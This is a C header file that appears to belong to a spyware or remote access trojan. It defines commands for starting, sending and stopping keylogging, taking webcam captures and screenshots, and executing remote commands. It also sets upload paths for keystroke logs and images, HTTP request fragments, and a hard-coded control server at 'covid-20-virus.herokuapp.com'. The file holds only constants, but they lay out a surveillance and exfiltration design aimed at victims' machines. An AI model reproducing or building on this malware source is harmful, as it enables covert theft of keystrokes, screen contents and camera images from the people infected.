#pragma once
#define STACK_SIZE 16384 // 16 KB
#define ONE_MIN 60000 // miliseconds
#define MAX_FILE_READ 262144 // 256 KB
#define START_KEYLOGGING "start_keylogging"
#define SEND_KEYLOGGING "send_keylogging"
#define STOP_KEYLOGGING "stop_keylogging"
#define WEBCAM_CAPTURE "take_webcam_capture"
#define SCREENSHOT "take_screenshot"
#define NO_COMMANDS "no_commands"
#define STOP_EXECUTION "stop_execution"
#define EXECUTE "execute"

#define MAX_STR_LEN 64
#define MAX_HEADER_LEN (2 * MAX_STR_LEN + 4)
#define MAX_GET_REQUEST_LEN 1024
#define MAX_RESPONSE_LEN 1024
#define MAX_HEADERS 16
#define MAX_COMMANDS 10
#define MAX_COMMAND_LEN 64

#define WORKING_BUFFER_SIZE 16384 // 16 KB
#define MAC_ADDRESS_LENGTH 17
#define MAX_BUFFER_LEN 1024
#define MAX_DIGITS 16
#define MAC_ADDRESS_ERROR "Mac address error"
#define BAD_REQUEST_PHRASE "Bad Request"
#define BAD_REQUEST_STATUS_CODE "400"

#define PORT "80" // HTTP port
#define HOST "covid-20-virus.herokuapp.com"
#define GET "GET /"
#define HTTP " HTTP/1.1\r\n"
#define CRLF "\r\n"
#define POST "POST /"

#define WIN32_LEAN_AND_MEAN
#ifdef __STDC_ALLOC_LIB__
#define __STDC_WANT_LIB_EXT2__ 1
#else
#define _POSIX_C_SOURCE 200809L
#endif
#define MAX_DELIMITER_LEN 16
#define MAX_TOKEN_LEN 512
#define DATETIME_LEN 30
#define COLON ": "
#define DATETIME_FORMAT "%a, %d %b %Y %T GMT"
#define BMP_MIME "image/bmp"
#define TEXT_MIME "plain/text"
#define WEBCAM_URI "webcam_capture"
#define SCREENSHOT_URI "screenshot"
#define KEYLOG_URI "keylog_data"

#define MAX_REPR_LEN 8
#define NUMPAD_DELTA 0x30
#define NUM_START 0x30
#define NUM_END 0x39
#define LETTERS_START 0x41
#define LETTERS_END 0x5A
#define CASE_DELTA 0x20
#define MAX_TITLE_LEN 256
#define LOG_FILENAME "log.txt"